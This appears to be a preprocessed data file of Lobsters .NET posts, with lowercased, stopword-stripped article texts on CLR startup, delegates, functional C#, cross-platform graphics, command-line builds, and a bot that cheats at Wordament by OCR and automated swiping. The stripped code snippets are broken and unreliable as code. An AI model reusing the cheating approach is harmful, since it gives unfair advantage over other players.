ifdef statement also note link take code function called line code within eestartuphelper phase setup infrastructure need place anything else run wireup console handling setconsolectrlhandler ifndef featurepal initialise internal sstring class everything us string sstring startup make sure configuration setup setting control runtime option accessed eeconfig setup initializehostconfigfile defined crossgencompile initialize numa cpu group information numanodeinfo initnumanodeinfo cpugroupinfo ensureinitialized ifndef crossgencompile initialize global configuration setting based startup flag initializestartupflags setup thread manager give runtime access o threading functionality startthread join setthreadpriority etc initthreadmanager initialize event tracing etw fire clr startup event initializeeventtracing etwfireevent ifdef featureeventtrace setup g cookie buffer security check help prevent buffer overrun initgscookie create datastructures needed hold frame used stacktraces frame init ensure initialization apphacks environment variable getglobalcompatibilityflags ifndef featurecoreclr create diagnostic performance log used runtime initializelogging ifdef logging perflog perfloginitialize ifdef enableperflog phase initialise core lowlevel component write log eestartup starting ensure runtime library function interact ntdlldll enabled ensurertlfunctions ifndef featurepal setup global store event mutexes semaphore used synchronisation within runtime initeventstore create assembly binding logging mechanism aka fusion initializefusion ifdef featurefusion initialize actual assembly binder infrastructure ccoreclrbinderhelper init turn call assemblybinder startup ifdef featurefusion defined setup heuristic used control monitor crsts simplerwlocks initializespinconstants initialize interprocess communication com ipc initializeipcmanager ifdef featureipcman setup enable performance counter perfcounters init ifdef enableperfcounters setup clr interpreter interpreter initialize ifdef featureinterpreter turn clr mode code interpreted instead compiled initialise stub used clr calling method triggering jit stubmanager initializestubmanagers also stub init stublinkercpu init set core handle map used load assembly memory peimage startup startup access check option used grantingdenying security demand method call accesscheckoptions startup startup mscorlib binder used loading known type mscorlibdll mscorlibbinder startup initialize remoting allows outofprocess communication cremotingservices initialize ifdef featureremoting setup data structure used gc weak strong nopin reference refinitialize setup context used proxy method call across app domain context initialize wireup event allow ee synchronise shutdown gpeeshutdownevent createmanualevent false initialise processwide data structure used readerwriter lock implementation crwlock processinit ifdef featurerwlock initialize debugger manager cclrdebugmanager processinit ifdef featureincludeallinterfaces initialize clr security attribute manager cclrsecurityattributemanager processinit ifdef featureipcman setup manager virtual call stub virtualcallstubmanager initstatic initialise lock gc us controlling memory pressure gcinterface mmemorypressurelockinit crstgcmemorypressure initialize assembly usage logger initassemblyusagelogmanager ifndef featurecoreclr phase startup lowlevel component ie error handling profiling api debugging setup app domain used clr systemdomain attach also creates defaultdomain shareddomain calling systemdomain createdefaultdomain shareddomain attach start ecall interface private native calling interface used within clr ecall init setup cache stub used delegate comdelegate init setup globalstatic variable used ee executionmanager init initialise watson window error reporting initializewatson fflags ifndef featurepal initialize debugging service must done ee thread object created class module loaded initializedebugger ifdef debuggingsupported activate managed debugging assistant clr provides manageddebuggingassistants eestartupactivation ifdef mdasupported initialise profiling api profilingapiutility initializeprofiling ifdef profilingsupported initialise exception handling mechanism initializeexceptionhandling install clr global exception filter installunhandledexceptionfilter ensure initial runtime thread created setupthread turn call setupthread initialise prestub manager prestub trigger jit initprestubmanager corresponding helper stubhelpers init initialise com interop layer initializecominterop ifdef featurecominterop initialise ndirect method call lazy binding unmanaged pinvoke target ndirect init setup jit helper function place execution manager run initialise setup syncblock cache syncblockcache attach syncblockcache start create cache used walkingunwinding stack stackwalkcache init phase start main component ie garbage collector gc appdomains security start security system handle code access security ca security start turn call securitypolicy start wireup event allow synchronisation appdomain unloads appdomain createadunloadstartevent initialise stack probe used setup stack guard initstackprobes ifdef featurestackprobe initialise gc create heap us initializegarbagecollector initialise table used hold location pinned object initializepinhandletable inform debugger defaultdomain interact systemdomain system publishappdomainandinformdebugger ifdef debuggingsupported initialise existing oob assembly list idea existingoobassemblylist init ifndef featurecoreclr actually initialise system domain contains mscorlib start executing systemdomain system init phase final setup notify component ee started tell profiler stated systemdomain notifyprofilerstartup ifdef profilingsupported precreate thread handle appdomain unloads appdomain createadunloadworker ifndef crossgencompile set flag confirm initialisation ee succeeded gfeeinit false load system assembly mscorlib default domain systemdomain system defaultdomain loadsystemassemblies setup shared static variable stringempty default domain systemdomain system defaultdomain setupsharedstatics contained internal class sharedstaticscs setup stack sampler feature identifies hot method code stacksampler init ifdef featurestacksampling perform onceonly safehandle initialization safehandle init ifndef crossgencompile set flag indicate clr successfully started gfeestarted true geestartupstatus sok hr sok write log eestartup completed done clr ready execute code executing code code executed first jitted via following code flow executeassembly assembly executemainmethod runmain assemblycpp discus post hacker news rprogramming information clr provides huge amount log information create debug build enable right environment variable link take various log produced running simple hello world program shown top post give pretty good idea different thing clr behindthescenes
437,Lobsters,dotnet,"C#, F#, .NET programming",Actors for Go and .NET,http://proto.actor/,actor go net,virtual actor read,virtual actor virtual actor abstraction provides straightforward approach building distributed interactive application without need learn complex programming pattern handling concurrency fault tolerance resource management read
440,Lobsters,dotnet,"C#, F#, .NET programming",How do .NET delegates work?,http://www.mattwarren.org/2017/01/25/How-do-.NET-delegates-work/,net delegate work,net delegate work make code functional il delegate andor lambda ecma standard common language infrastructure cli method descriptor kind methoddescs eeimpl ecma partition ii delegate net type internals microsoft clr perspective understanding net delegate event practice runtime creates delegate inlining delegate ctors method descriptor fcall delegate constructor compiler fgoptimizedelegateconstructor correct delegate ctor link c code inlining possible creation delegate invoke method virtual method dispatch jitter method descriptor precode stub shuffle thunk setup open delegate v closed delegate call opcode compiler impimportcall compiler fgoptimizedelegateconstructor comdelegate getdelegatector comdelegate setupshufflethunk stubcachebase canonicalize shufflethunkcache compilestub version function call different type delegate delegate kind table instance open nonvirt delegate shuffle thunk target method note internal field delegate delegate special rprogramming rcsharp link general info internal delegate info debugging delegate,net delegate work jan word delegate fundamental part net runtime whilst rarely create directly underthehood every time use lambda linq func action make code functional actually work going clr use il delegate andor lambda let start small code sample like public delegate string simpledelegate int x class delegatetest static int main create instance class delegatetest instance new delegatetest instancename instance create delegate simpledelegate new simpledelegate instanceinstancemethod call instancemethod via delegate compiler turn string result return instance string instancemethod int return stringformat name take look il simpledelegate class ctor invoke method look like methodimpl methodcodetypemethodcodetyperuntime public simpledelegate object object intptr method methodimpl methodcodetypemethodcodetyperuntime public virtual string invoke int x turn behaviour manadated spec ecma standard common language infrastructure cli internal implementation delegate part responsible calling method created runtime need complete control method delegate fundamental part clr security issue performance overhead inefficiency would big problem method created way technically know eeimpl method ie implemented execution engine book runtime botr section method descriptor kind methoddescs eeimpl delegate method whose implementation provided runtime invoke begininvoke endinvoke see ecma partition ii delegate also information available two excellent article net type internals microsoft clr perspective section delegate understanding net delegate event practice section internal delegate representation runtime creates delegate inlining delegate ctors seen runtime responsibility creating body delegate method done start wiring delegate constructor ctor per botr page method descriptor fcall internal method implemented unmanaged code method marked methodimplattribute methodimploptionsinternalcall attribute delegate constructor tlbimp constructor runtime happens jit compiles method contains il code creating delegate compiler fgoptimizedelegateconstructor jit firstly obtains reference correct delegate ctor simple case ctoropened object target intptr methodptr intptr shufflethunk link c code finally wiring ctor inlining possible maximum performance creation delegate invoke method interesting process happens creating invoke method using technique involving stub code rawassembly know locate information target method jump control stub actually used widevariety scenario instance virtual method dispatch also jitter method first called hit precode stub cause method jitted stub replaced call jitted native code particular case delegate stub referred shuffle thunk part work shuffle argument passed invoke method correct place stackregister time target method called understand going helpful look following diagram taken botr page method descriptor precode stub shuffle thunk discussing particular case stub sit corresponding box diagram shuffle thunk setup let look code flow delegate created sample beginning post specifically open delegate calling instance method wondering difference open closed delegate read open delegate v closed delegate start impimportcall method deep inside net jit triggered call opcode delegate encountered go following function compiler impimportcall compiler fgoptimizedelegateconstructor comdelegate getdelegatector comdelegate setupshufflethunk stubcachebase canonicalize shufflethunkcache compilestub emitshufflethunk specific assembly code different cpu architecture code version chosen shortest one three see emits assembly code fetch real target address methodptraux loop method argument put correct register ie shuffle place finally emits tailcall jump target method associated delegate void stublinkercpu emitshufflethunk shuffleentry pshuffleentryarray entry hold delegate instance look real target address stored methodptraux field save tailcall target method rearranging argument ldr offsetof delegateobject methodptraux emitloadstoreregimm eload intreg intreg delegateobject getoffsetofmethodptraux add delegateobject getoffsetofmethodptraux load indirection cell used resolveworkerasmstub emitaddimm intreg intreg delegateobject getoffsetofmethodptraux shuffleentry pentry pshuffleentryarray pentry srcofs shuffleentry sentinel pentry pentry srcofs shuffleentry regmask source present register destination must also register asserte pentry dstofs shuffleentry regmask emitmovreg intreg pentry dstofs shuffleentry ofsmask intreg pentry srcofs shuffleentry ofsmask else pentry dstofs shuffleentry regmask source must stack asserte pentry srcofs shuffleentry regmask emitloadstoreregimm eload intreg pentry dstofs shuffleentry ofsmask regsp pentry srcofs sizeof void else source must stack asserte pentry srcofs shuffleentry regmask dest must stack asserte pentry dstofs shuffleentry regmask emitloadstoreregimm eload intreg regsp pentry srcofs sizeof void emitloadstoreregimm estore intreg regsp pentry dstofs sizeof void tailcall target br emitjumpregister intreg function call setupshufflethunk place code also emit shuffle thunk listed used various scenario delegate explicitly created eg via delegatecreatedelegate different type delegate looked one type delegate work instance open nonvirt table helpful see different type runtime deal informative delegate kind table clr source delegate type target methodptr methodptraux instance closed ptr target method null instance open nonvirt delegate shuffle thunk target method instance open virtual delegate virtualstub dispatch method id static closed first arg target method null static closed special sig delegate specialsig thunk target method static opened delegate shuffle thunk target method secure delegate call thunk methoddesc frame note column map internal field delegate systemdelegate deliberately looked simple case complex scenario work along similar line using different stubsthunks needed eg virtualstub dispatch call thunk delegate special well responsible creating delegate runtime also treat delegate specially enforce security andor typesafety see implemented link methodtablebuildercpp classcompatcpp discus post rprogramming rcsharp link read far good job reward extra link cover could possibly want know delegate general info internal delegate info debugging delegate
442,Lobsters,dotnet,"C#, F#, .NET programming",Is C#7 starting to look like a functional language?,https://medium.com/@enrico.buonanno/is-c-7-starting-to-look-like-a-functional-language-d4326b427aaa,c starting look like functional language,c starting look like functional language c language many functional feature added still added every successive release support function value discourage inplace update automatically manage memory functional language c functional nature linq functional feature c c note listing c c feature relevant fp importing static member easier immutable type getteronly autoproperties concise function expressionbodied member local function better syntax tuples functional future c multiparadigm language increasingly strong functional component,c starting look like functional language article excerpted chapter functional programming c many programmer make tacit assumption functional programming fp functional language given c objectoriented language even worth making attempt program functionally c course superficial take indepth knowledge c evolution probably know c multiparadigm language f although started mostly imperative objectoriented language many functional feature added still added every successive releaseso begs question well c support programming functional style today answer let first clarify mean functional programming namely programming paradigm emphasizes use function andavoids state mutationto support style programming language must support function value must possible treat function value specifically use function argument return value function store functionsin collectionsdiscourage inplace update indeed make impossible variable object data structure immutable default easy create modified version objectautomatically manage memory creating modified copy rather mutating data inplace end creating object impractical language without automatic memory managementwith mind ready broach question functional language c let function indeed value c example consider code func int int triple x x var range enumerablerange var triple rangeselect triple triple demonstrates function value since assign function variable triple give argument selectin fact c support function value earliest version language delegate type subsequent introduction lambda expression made syntactic support even betterthere quirk limitation come example type inference especially want pas multiargument function argument another function discus chapter overall support function value pretty ideally would also like language discourage inplace update c greatest shortcoming everything mutable default programmer substantial amount effort achieve immutability field variable mutable default must explicitly marked readonly prevent mutation compare f variable immutable default must explicitly marked mutable allow mutation type immutable type framework string datetime language support userdefined immutable type poor although see next improved c likely improve future version finally collection framework mutable solid library immutable collection hand c satisfy important requirement automatic memory management mean although encourage programming model avoids inplace update support thanks garbage collectionin summary c good support functional technique others evolution improved continue toimprove support functional techniquesnext review language feature past present upcoming version c particularly relevant fpthe functional nature linqwhen c released along net framework included ahost feature inspired functional language consisted linq library systemlinq new language feature enabling enhancing could linq extension method expression treeslinq offer implementation many common operation list moregenerally sequence asienumerables technically becalled common mapping sorting filteringhere example combining three enumerablerange orderby select notice orderby select take function argument mutate given ienumerable return new ienumerable instead illustrating tenet fp mentioned abovelinq facilitates querying object memory linq object various data source like sql table xml data c programmer embraced linq standard toolset workingespecially list relational data accounting substantial amount typical codebase side mean already sense functional library api feel likeon hand working type c programmer generally stick imperative style using control flow statement express program intended behaviour result c codebases seen patchwork functional style working ienumerables iqueryables imperative style everything else mean c programmer aware benefit using functional library linq enough exposure design principle behind linq leverage technique designsthis something book aim addressfunctional feature c c revolutionary c c c bring many smaller language feature taken together provide much better experience idiomatic syntax coding functionallynote feature c c introduce better syntax new functionality using older version c still apply technique shown book bit extra typing however feature significantly improve readability making attractive program functional stylelet see feature action listing discus relevant fplisting c c feature relevant fpusing static systemmath public class circle public circle double radius radius radius public double radius get public double circumference pi radius public double area get double square double pow return pi square radius public double circumference double area stats circumference area using static enables unqualified access static member systemmath like pi pow belowa getteronly autoproperty set constructoran expressionbodied propertya local function method declared within another methodc tuple syntax allows member namesimporting static member using static using static statement c allows u import static member class example systemmath class result example invoke pi pow member math without qualificationusing static systemmath public double circumference pi radius important fp prioritize function whose behaviour relies input argument reason test function isolation contrast instance method whose implementation relies instance member function implemented static method c functional library c consist mainly static methodsusing static allows u easily consume library overuse lead namespace pollution reasonable use make clean readable codeeasier immutable type getteronly autopropertieswhen declare getteronly autoproperty radius compiler implicitly declares readonly backing field result property assigned value constructor inlinepublic circle double radius radius radius public double radius get getteronly autoproperties c facilitate definition immutable type circle class demonstrates one field backing field radius readonly created circle never changemore concise function expressionbodied membersthe circumference property declared expression body introduced rather usual statement body notice much concise compared area property public double circumference pi radius fp tend write lot simple function many oneliners compose complex workflow expressionbodied method allow u minimal syntactic noise particularly evident want write function return function something lot bookthe expressionbodied syntax introduced c method property generalized c also apply constructor destructors getters setterslocal functionswriting lot simple function mean often function called one location c allows u make explicit declaring method within scope method instance square method declared within scope area getterget double square double pow return pi square radius better syntax tuplesthis probably important feature c allows u easily create consume tuples importantly assign meaningful name element example stats property return tuple type double double additionally specifies meaningful name element accessedpublic double circumference double area stats circumference area reason tuples important fp come tendency break task small function may end data type whose purpose capture information returned one function expected input another function impractical define dedicated type structure correspond meaningful domain abstraction tuples come ina functional future c writing first draft chapter early development c early day interesting see feature language team identified strong interest feature normally associated functional language included record type boilerplatefree immutable type algebraic data type powerful addition type system pattern matching similar switch statement work shape data example type rather value better syntax tupleson one hand disappointing last item could delivered limited implementation pattern matching also shipped still far cry kind pattern matching available functional language generally inadequate way like use pattern matching programming functionallyon hand feature still table future version work done respective proposal mean likely see record type complete implementation pattern matching future version c c poised continue evolution multiparadigm language increasingly strong functional component learn book give good foundation keep evolution language industry good understanding conceptsand motivation behind future version language
443,Lobsters,dotnet,"C#, F#, .NET programming","How I cheated at Wordament, and won",https://blog.martindoms.com/2017/01/17/wordament-cheat-bot,cheated wordament,wordament cheat wordament approach solver quick program prefix tree written grab binary depth first search reader ocr readerfs bitbucket repository code player single test class result problem,code article found see bot action wordament cheat wordament wordsearching game android iphone window phone hah game display four four grid letter player job swipe letter find word point awarded every word found based complexity every player play board simultaneously game rank player round always pretty bad game making top good day playing noticed player top scoreboard either extremely good legit many score word count seemingly high achieved human second set beat top player writing bot bother care getting best score wordament seemed like interesting technical challenge approach wanted use challenge play fun technology approach little convoluted wrote web service run microsoft azure website platform free tier service take wordament board input give possible solution board output wrote android ui automation test test take screenshot board find letter sends letter azure service get possible solution us ui automation swipe solution game board call component solver reader player solver need component find every solution given wordament board solution context word plus tile position board need swipe input word example give board lhas dlam inon ctag might output something like word montana position word amanita position etc would leave devicespecific code transform board coordinate screen coordinate creating dictionary first need list possible word google word list dictionary list found bunch option download towards end project found every individual list found two deficiency none complete set word given board lot word expect find wordament board solved creating quick program take directory word list return word appear least three list way every word final set common enough found many dictionary high likelihood possible wordament word also common word missing one word list likely found others data structure wanted search wordament board given word letter board find word start neighbouring letter neighbouring letter word current list finish letter add solution result repeat every connected letter pseudocode algorithm foreach letter board dosearch letter dosearch currentword resultset wordscontains currentword resultset resultsetadd currentword foreach letter currentwordneighbours wordswithprefix currentword letter dosearch currentword letter resultset happens data structure purpose built perform kind prefix search called prefix tree trie pronounced tray written prefix tree implemented mine f find code grab binary nuget go detail prefix tree suffice say expose exactly interface need perform prefix search see interface action article searching solution solve board given letter see reader section get need pas search algorithm also need pas trie preloaded word list described actual f code board module type model requirequalifiedaccess module board let col let row let cell row col type solution word position member thisword word member thispositions position type letter index character neighbour member thischaracter character member thisneighbours neighbour member thisindex index let generateneighbours board currentindex seq currentindex col currentindex col yield currentindex yield currentindexcols currentindex col yield currentindex currentindex col yield currentindex col yield currentindex cellscols currentindex col yield currentindex yield currentindex col currentindex col yield currentindex type board letter string let charlist listofarray letterstochararray member thislettergraph charlist listmapi fun index character new letter index character listofseq generateneighbours letter index let depthfirstsearch board board shortcircuitfunction string bool selectorfunction string bool let rec search board board currnode letter currstring path searchedlist seq let newstring currstring currnodecharactertostring shortcircuitfunction newstring selectorfunction newstring yield solution newstring listrev path neighbourindex currnodeneighbours path listcontains neighbourindex let nextletter boardlettergraph neighbourindex yield search board nextletter newstring nextletterindex path currnodeindex searchedlist seq letter boardlettergraph yield search board letter letterindex algorithm let solve boardletters trie let board new boardboard boardletters let solution boarddepthfirstsearch board fun trieisprefix trie fun trieisword trie seqfilter fun swordlength seqdistinctby fun sword seqsortby fun sword seqsortbydescending fun swordlength solution worth explaining define couple type solution word list integer giving position letter letter node board point neighbour represent board graph board take string representing letter hook together based location grid generateneighbours function next define depth first search normal dfs algorithm added feature take short circuit function function return true point search search halt search tell stop current word valid prefix word trie result search function list solution including path required one web service wrote web service host solver code simple aspnet mvc service three controller first named readercontroller capable taking bitmap image screenshot wordament board body request return letter board text reader later mostly used testing debugging used final application next controller called solutioncontroller take letter character wordament board sends solver return solution board like readercontroller mostly testing debugging third controller poorlynamed solvercontroller guy combine behaviour previous two controller read wordament screenshot request sends letter text solver return solution caller one used android program find solution wordament screenshot reader getting letter board took bit effort presumably prevent cheating microsoft put kind identifying metadata onto object make board option analyse bitmap phone screen board needed simple ocr algorithm would allow identify letter bitmap playing pretty crappy web service decided roll implementation simple inflexible work well wordament board code discus available readerfs bitbucket repository written f would easy port language first needed cut wordament board individual bitmap letter needed search bitmap orange letter tile start defining start end row wanted perform search hard coded ratio screen size always used ratio absolute pixel value testing app many device different resolution let findsquares bitmap systemdrawingbitmap let startrow int systemmathround float bitmapheight let endrow int systemmathround float bitmapheight getsquares bitmap startrow endrow idea wanted divide board orange pixel inside boundary letter tile way use distinctive orange colour easily divide letter tile divided wordament board like next getsquares function iterate row pixel looking first orange pixel row find orange pixel iterate across run orange pixel boundary make bounding rectangle tile continue search next tile starting upper right rectangle repeat run room pixel row jump full tile height start searching row full code let isorange color color colorr byte colorg byte colorg byte colorb byte let getbounds bitmap bitmap col row let colupper seq col seqfind fun p isorange bitmapgetpixel p row let rowupper seq row seqfind fun p isorange bitmapgetpixel col p new rectangle col row coluppercol rowupperrow let getsquares bitmap bitmap startrow endrow let mutable row startrow let mutable col let mutable rectheight let mutable result row endrow col bitmapwidth let color bitmapgetpixel col row isorange color let rect getbounds bitmap col row col col rectwidth rectheight rectheight result rect result else col col col row row rectheight rectheight result listrev probably le stupid way finding bounding box work well ツ divide board square bitmap like match bitmap letter divided bitmap quarter assigned quadrant value based ratio white orange pixel example letter g socalled letter vector get letter vector value painstakingly analysing ton screenshots wordament board fact look code see actually missing q x letter appear infrequently wordament able snap screenshot analyse may also notice assign value upper left quadrant implementing testing whole system found letter matching discovered digit upper left letter tile score change value certain board happens special round like letter corner valuable enough throw simple algorithm could made algorithm permissive found three quadrant enough uniquely identify letter threw upperright quadrant away bitmap letter tile predefined vector letter map break bitmap tile quadrant transform quadrant vector ratio white orange find vector map closely match vector bitmap code let vdist float b c aa bb cc sqrt aaa aaa bbb bbb ccc ccc let matchlettervector b c letter listminby fun v let aa bb cc v vdist b c aa bb cc let toletter bitmap bitmap rect rectangle let w rectwidth let h rectheight let size new size w h let quad seq yield bitmapclone new rectangle new point rectx recty size bitmappixelformat yield bitmapclone new rectangle new point rectx sizewidth recty size bitmappixelformat yield bitmapclone new rectangle new point rectx recty sizeheight size bitmappixelformat yield bitmapclone new rectangle new point rectx sizewidth recty sizeheight size bitmappixelformat let list quad seqmap fun q whitepixelcount q listofseq let vector list list list let b c letter matchlettervector vector vdist b c vector else lettertostring combine two function break board bitmap letter tile pas tile toletter function wind letter return pas letter solver defined pop solution ready input game player surprisingly player finicky least fun part project fairly quick describe created simple donothing android project single test class test class take screenshot game board sends web service sends reader solver test receives solution input application screenshotting board screenshotting board android test straightforward string dir environment getexternalstoragedirectory getabsolutepath string filename filepng file file new file dir fileseparator filename logd wordamentbot screenshotting board boolean screenshotresult devicetakescreenshot file screenshotresult logd wordamentbot failed take screenshot taken screenshot need prepared sent web service important part compress screenshot remember wrote quite brittle reader need make sure orange white ratio image match expectation mean using compression method preserve color edge jpeg definitely png good fit also decided scale image factor two side preserve ratio white orange reduces size image factor four significantly improves performance especially using highresolution device like pixel phone could probably scale perfectly fine much smaller size enough used pretty standard json handling manage request response nonnull private solution getsolutionsfromweb file file try string dir environment getexternalstoragedirectory getabsolutepath file compressedfile new file dir fileseparator bitmap capturedimage bitmapfactorydecodefile filegetpath bitmap bitmap bitmapcreatescaledbitmap capturedimage capturedimagegetwidth capturedimagegetheight true fileoutputstream fo new fileoutputstream compressedfile bitmapcompress bitmapcompressformatpng fo fosflush fosclose byte byte ioutilstobytearray new fileinputstream file okhttpclient client new okhttpclient request request new requestbuilder url http wordamentbotazurewebsitesnetsolver method post requestbodycreate imagepng byte build response response clientnewcall request execute gson gson new gson return gsonfromjson responsebody string solution class catch ioexception e logd wordamentbot problem contacting ocr servicern egetmessage return new solution solution need figure input first step figuring game board screen letter tile couple utility method achieving us standard android ui automation test tool querying interacting android object model nonnull private list point gettilecoordinates board list tile boardgetchildren list point center new arraylist int tilessize centersadd tilesget getvisiblecenter return center nonnull private getgameboard boardview null logd wordamentbot waiting device device uidevicegetinstance instrumentationregistrygetinstrumentation try list object devicefindobjects byclazz androidwidgetrelativelayout view object game board view exactly child view letter tile take least two third screen halfscreen game board see round viewgetchildcount viewgetvisiblebounds width float devicegetdisplaywidth logd wordamentbot found view subviews boardview view break catch staleobjectexception e logd wordamentbot caught staleobjectexception probably changing screen boardview null board visible go back try return boardview result method coordinate represent letter know letter swipe matter performing swiping automated testing tool solution solution solution solutionsolve device center logd wordamentbot swiped solutionword class solution public string word public int position swipe solution onto given device supplied letter tile coordinate protected void solve uidevice device list point tilecoords point coords new point thispositionslength int thispositionslength int index thispositions coords tilecoordsget index deviceswipe coords coordslength android test framework supply simple api u swipe ui little work u result problem quick video result bot get u top leaderboard game capable solving well video limitation go way project certain board bot solve example board right see board letter combination ammending bot handle letter combo like would straightforward except generating letter vector identify every possible combination either lot painstaking work smarter ocr system wouwld required another limitation special game wordament present favourite game include game like e corner every corner e tile worth much point case bot well game result exhaustive discussed word list section dictionary fact completely exhaustive missing significant number e result word list may miss many point win game good news either case bot still perform letter recognised returned letter never occurs although tile never used bot continue work around problem intend solve bot muckaround project update bot yourslef love see keen hear feedback offer thanks reading
446,Lobsters,dotnet,"C#, F#, .NET programming",Cross-Platform Graphics in .NET Core,https://medium.com/@cameronaavik/cross-platform-graphics-in-net-core-901be29dabd7,crossplatform graphic net core,crossplatform graphic net core avalonia comment platform invoke platform invoke opengl glfw permissive license getting working window delegate pencilgaming opengl binding c reference right glfw library dllmap issue coreclr github comment issue output platform section article referencing right opengl library commit seen linux working issue issue specific creating platform app instead commit conclusion source issue use loadlibrary mellinoe game engine,crossplatform graphic net coreupdate post quite outdated would recommend looking avalonia looking make anythinga couple week ago browsing rprogramming reading new roadmap net core net standard came upon comment someone mentioned fact possible make game net core clue possible graphic decided investigation want skip final source hereplatform invokenet core framework provide ability access structs callback function unmanaged library dll dylib using something called platform invoke meant could call function opengl library c create graphic way never done opengl though time learningopengl glfwwhen learning opengl came across two site helped learn everything needed get working reading became clear create graphic application using opengl alone ended deciding using glfw first link mentioned came absolute necessity create context neededanother nice thing glfw permissive license allowed redistribute library freelygetting working windowsi mainly develop window firstly wanted get working worry crossplatform later ran couple issuesthe first issue opengl function fixed dll instead retrieved function pointer another function wglgetprocaddress window glxgetprocaddress linux thankfully glfw function meant need worry crossplatform issue called glfwgetprocaddressthe next issue store function pointer c c feature called delegate essentially function pointer well thanks project pencilgaming able look source see thing written opengl binding c except mono meant following code would let use function glgenbuffers opengl calling genbuffers ref vbo overcoming two issue got working window created simple white triangle black backgroundhow reference right glfw libraryunfortunately mac bit lazy set linux vm lot development blind first hurdle knew figure somehow reference different glfw library depending platform running glfwdll window libglfwdylib osx libglfwso linux well name library specified compile time could decided runtimeafter looking around found mono great feature known dllmap allowed one map library name different one depending platform compiled unfortunately feature available net corethis lead onto issue coreclr github plenty discussion get working one comment issue mentioned coreclr actually attempt append platform specific suffix prefix depending platform running turned instead using glfwdll code simply use glfw would work every platformoutputs platformafter searching many document came across section article include native dependency library thought wanted said could use multiple runtime identifier use includefiles say file wanted includedwell would great creating library unfortunately creating library use packoptions turned try using publishoptions problem dotnet publish publish one runtime time make use inbuilt way include file automatically getting bit complicated resorted back simple shellbatch script published runtime individually copied glfw library right directory afterwards worked great except fact tried get friend try run mac linux work allreferencing right opengl libraryso turn opengl library called linux meant take advantage automatic prefixing worked glfw opengl library osx place automatically searched reference fully qualified path iti asked friend mac first test changing name opengl dll referenced version library worked idea instead make use preprocessor directive conditionally compile part code say name opengl library would typically kind thing c net frameworkalthough may right approach came another issue dotnet publish let say want defined run resorted shameful shellbatch script commit seen script essentially renamed programcs temporary file added define wanted top file published platform restored backupi sent linux friend try seem work stillwhy linux workingwhenever people tried run linux always getting following error failed initialise coreclr hresult error lead issue got people tried make sure could use dotnet version icu libunwind installed issue still occurringto completely honest sure exactly caused hunch related unresolved issue herealso creating chose ubuntu runtime select generic linux runtime publish apparently specific compiling linux runtime specify exact ubuntu version inflexible made ask even trying use standalone apps first place thought maybe would better go back using platform app instead creating standalone appcreating platform app insteadi later realised bug previous version still including window define inside buildoptions part projectjson thought maybe instead modifying source file add define platform wanted could multiple projectjsons even better could use includefiles copy glfw library myselfso modified project instead platform app took advantage option specify output directory dotnet publish could output platform created projectjson platform define wanted file wanted included modified shellbatch script hotswap projectjson publish see commit end worked platform conclusionyou look source heremy result investigation turned following issue make workarounds reader know better solution found mistake post let knowthere clean way conditionally compile different operating system projectjson structure may fixed preview use projectjson however preview tool available v window defeat whole multiplatform purpose able create standalone app support linux distribution want specific runtime publishing app well seems issue trying get standalone apps running linux allthere way specify dllimport path runtime must compile time potential alternative instead use loadlibrary however found quite recently may better solution seemed little bit messier requires much codehowever safely say possible make use crossplatform graphic net core thus turn gamesedit thought would add awesome work done someone github named mellinoe game engine project binding gui toolkits wanted make game gui application net core probably take look stuff working
448,Lobsters,dotnet,"C#, F#, .NET programming",The Lazy Developer’s Guide to Command Line Building with C#,https://mianlabs.com/2017/01/02/the-lazy-developers-guide-to-command-line-building-with-c/,lazy developer guide command line building c,developer command prompt csi interactive c repl read csc c compiler essential window command prompt command make remove crossplatform building visual studio code net core visual studio code watch mono mc mono mono c scripting language scriptcs csi scriptcs,many c developer building running small project even single class file usually mean launch visual studio dealing overhead ide large boilerplate project code making testing exploration language net framework much le enjoyable another way lazier way way called command line tool need make writing testing gist snippet mound c code easier ever developer command prompt included every installation visual studio convenient development shell grant access two following c commandline utility csi interactive c repl need refresher feature language work confirm whether code valid c even need compiler use csi directly command line stand c sharp interactive readevalprint loop repl program designed facilitate understanding code write working csi pretty intuitive start program simply enter csi developer command prompt type expression without semicolon examine value write block statement immediately use referencing library dlls testing easy r directive make sure current working directory r mylibrarydll speaking directory intend use csi csc frequently probably want change starting directory developer command prompt window simply navigate directory contains shortcut launching developer command prompt right click select property edit start field whatever directory path like learn csi make time c enjoyable productive read official interactive walkthrough csc c compiler microsoft c compiler could expect good compiler thanks c language design around namespaces assembly compiling file library across directory one executable hard compiling file executable csc filecs compiling file customnamed executable csc namedexe filecsc compiling multiple file current directory subdirectory named lib one executable csc liblibrarycs compiling file current directory one class file must contain main method csc c compiling file executable using library dll reference csc reference librarydll filecs compiling file dynamically linked library csc target library filecs mixing matching argument csc target library mylibdll c view list csc option essential window command prompt command window command prompt console certainly popular shell around still quite handy able know perform basic user task following command along decent code editor need work csc csi effectively cl clear console windowdir list available directory filescd change current directory pathmd make new folderrd remove file foldersctrl c exit current processupdown key iterate previous commandstab key press typing receive autocomplete suggestion crossplatform building visual studio code net core visual studio code vsc excellent opensource lightweight alternative visual studio used across window macos linux make use net core microsoft opensource version net framework mean write run share c project anyone vsc offer support omnisharp intellisense nuget git programming language making great tool type developer way c project work vsc folderbased file based want create new project make new directory folder visual studio code terminal make use following command ctrl open vsc terminaldotnet new creates new net core c project launchpoint class named programcsdotnet restore retrieves nuget dependency projectdotnet run build run project vsc also builtin debugger run key learn use visual studio code watch lively fiveminute tour software mono mc mono mono opensource crossplatform implementation net framework sponsored microsoft mean full access c net library across window macos linux among many others future expect generalpurpose code mono identical net core framework result largely c code across operating system platform mono compiler mc work similarly csc compiling file executable mc filecs compiling file customnamed executable mc namedexe filecsc compiling multiple file current directory subdirectory named lib one executable mc liblibrarycs compiling file current directory one class file must contain main method mc c compiling file executable using library dll reference mc r librarydll filecs compiling file dynamically linked library mc target library filecs mixing matching argument mc target library mylibdll c compiling using noncross platform window dlls mc winformsexe r systemwindowsformsdll r systemdrawingdll c view list mc option run executable use mono mono fileexe c scripting language scriptcs csi many people know use c perfectly legitimate scripting language using opensource crossplatform program called scriptcs well microsoft csi make new c script simply create csx file directly start writing code inside method object scriptcs support nuget package csi choice either depends whether need use nuget whether window run c script simply use following command scriptcs scriptcs filecsxwith csi csi filecsx brand new way use one better objectoriented language along five different commandline tool interacting c code making thing little easier
